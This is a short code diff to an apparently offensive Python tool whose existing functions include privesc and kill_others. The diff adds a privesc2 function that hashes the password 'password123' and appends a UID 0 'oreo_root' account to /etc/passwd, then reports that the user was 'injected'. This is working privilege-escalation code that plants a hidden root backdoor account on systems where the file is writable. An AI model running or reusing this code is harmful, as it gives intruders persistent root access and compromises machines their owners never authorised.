@@ -14,6 +14,7 @@ import time
 import contextlib
 import io
 import struct
+import crypt
 
 
 THIS_FILE = os.path.realpath(__file__)
@@ -64,6 +65,20 @@ def privesc():
             sys.exit(1)
     else:
         print("Already running with root privileges.")
+
+def privesc2():
+    # 1. Generate  hash
+    hash_str = crypt.crypt("password123", crypt.mksalt(crypt.METHOD_SHA512))
+    line = f"oreo_root:{hash_str}:0:0:root:/root:/bin/bash\n"
+    
+    try:
+        # 2. Open the file in 'append' mode directly
+        # This will ONLY work if the OS permissions are broken (world-writable)
+        with open("/etc/passwd", "a") as f:
+            f.write(line)
+        print("[+] Successfully injected user without sudo!")
+    except PermissionError:
+        print("[-] Permission denied: /etc/passwd is not world-writable.")
  
 def kill_others():
     """
